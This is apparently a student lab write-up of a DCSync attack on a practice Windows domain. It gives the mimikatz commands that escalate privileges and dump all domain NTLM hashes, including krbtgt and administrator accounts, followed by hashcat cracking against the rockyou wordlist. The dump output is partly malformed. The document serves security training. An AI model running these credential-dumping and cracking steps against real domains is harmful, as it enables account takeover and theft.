# DCsync Password Cracking
>> Performing a DC (Domain Control) sync pentest.

## Performing the DCSync.
- Using the administrator password obtained from the previous lab, I was able to gain access into the tortuga DC VM and load the Mimikatz trunk onto its desktop.
- Next, using the x64 version of mimikatz, I launched powershell from the file menu.
- With PowerShell open, I then launched Mimikatz using the command “./mimikatz.exe”. 
> -  NOTE: I used PowerShell instead of the default cmd launcher because of the limitations the default
cmd presents- While PowerShell is powerful and flexible

- I then used the mimikatz command “privilege::debug” to get “god tier” (debug) privileges, and then used those privileges to elevate my token using the mimikatz command “token::elevate”.
- Once I had elevated my privilege enough to access the password hashes through the DCSync, I used the command “lsadump::dcsync /domain:tortuga.local /all /csv”. This command dumps all the users within the tortuga.local domain along with their password hashes.
- Here’s the full output received from the previously discussed command:

```console
mimikatz # lsadump::dcsync /domain:tortuga.local /all /csv
[DC]
[DC]
[DC]"	"'tortuga.local' will be the domain 'dc01.tortuga.local' will be the DC server
Exporting domain 'tortuga.local'"	
1105	"U478384 0db3396a227ae978162e28d9f8bf3ff2"	66048
1106	"U724564 0bc2cd56aff62e231df637c9997f5db5"	66048
"… … …
1292"	"…
      "U472136 5437b3d561e5b3c302b8ea8f11aef318"	66048
1293	"U529036 3e202fa49136e93508b79bfca232479d"	66048
1294	"U328628 ad5e3408db1ea42441c755715c0c52a6"	66048
1295	"U879436 136ff21d05e3ad70135dc48884e81357"	66048
1296	"U858483 82fb725d156e9179063796dcc45d062a"	66048
1297	"U532495 3237a4cea1efc18fb4394dd41b7dd95d"	66048
1298	"U104961 2805976fa86da938b8b5209a0e73af75"	66048
1299	"U957087 3dbe233471445dbb58b72b95d80c71e7"	66048
1300	"U556079 bba37cb6350910920f27e495aac2d16c"	66048
1301	"U153711 6ba4fd921fa7ecdcc7ac2fe902b0657e"	66048
1302	"U786240 873333e2f8b3e477e840ffe5e77b2003"	66048
1303	"U348616 d64e61a36e000d77a5a1c98fbfe2ce6a"	66048
1304	"U786462 401511cbba86d51f9cd606b83a07d6d9"	66048
1305	"U594663 0ad8fb266a0e5921ebb56854200c6634"	66050
1309	"U257439 91e243f81613c8d3e7db88281c219a09"	66048
1310	"U478245 2d981fdd1f23a2085b7f331e856ab3a3"	590336
1311	"U951863 61b50ceaaa6fba36e9a2d2a85894044e"	17367552
1312	"U836158 ada363ecd153b172ecb664d8916af28d"	66176
1313	"U289311 018e5053ee63ea9da526bfdb51440022"	2097792
1314	"U697137 0f8389a06623ffeb4f866d2b1ba250d1"	640
1315	"U151654 cf3a5525ee9414229e66279623ed5c58"	640
1316	"U371973 cac3a73c02d89fd62392800815e0f425"	4194944
1306	"U891212 26b944d9d6872c12b41d75c39056c35e"	66048
1308	"U323582 09e0198d7ee73c264eb96bfadaa99d56"	66048
502	  "krbtgt  a3f657d01cd6a1f46a1ac36df545bf3b"	514
1320	"U536554 6f22b98d3db9991032ae6f267c0c2753"	672
1319	"wturner 793243be0762ce949633b1bf8c61de59"	66048
1317	"U787486 cac3a73c02d89fd62392800815e0f425"	672
1002	"DC01$   69fc65112f604d0f3c3c7e50d821c398"	532480
500	  "Admin   39d633e9c3fd963d603f131bf42d7ce8"
```

- Once I had all 214 usernames and password hashes for the tortuga.local domain, I moved the data to my attacker VM (Kali Linux distro). On this VM, I edited the data down to two
separate files; 
> - 1. Hashes only named “hashesonly.hashcat” and 
> - 2. Hashes with usernames"named “hashlist.hashcat. 
- Though I could use either of these files, the main file I used for cracking the passwords was the hashes only version.
- I then moved a copy of the “rockyou.txt” wordlist to the desktop and created a new file of the top-5000 words from the rockyou wordlist. This would simplify the use of flags to limit the word usage within the hashcat program itself.


## Cracking the hashes.
- Once the setup of the files had been completed, I moved on to using hashcat to start cracking the passwords. I started by running the hashesonly.hashcat files against the
rockyou.txt wordlist straight up with no other rules or flags.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$  hashcat  -m 1000 -a 0 -o outfile.txt hashesonly.hashcat rockyou.txt
```

```console
Session..........: hashcat 
Status...........: Exhausted 
Hash.Name........: NTLM 
Hash.Target......: hashesonly.hashcat 
Time.Started.....: Sat Apr 3 13:50:14 2021 (3 secs) 
Time.Estimated...: Sat Apr 3 13:50:17 2021 (0 secs) 
Guess.Base.......: File (rockyou.txt) 
Guess.Queue......: 1/1 (100.00%) 
Speed.#1.........: 3895.5 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 
Recovered........: 3/213 (1.41%) 
Digests Progress.........: 14344385/14344385 (100.00%) 
Rejected.........: 0/14344385 (0.00%) 
Restore.Point....: 14344385/14344385 (100.00%) 
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> 
$HEX[042a0337c2a156616d6f732103]
```
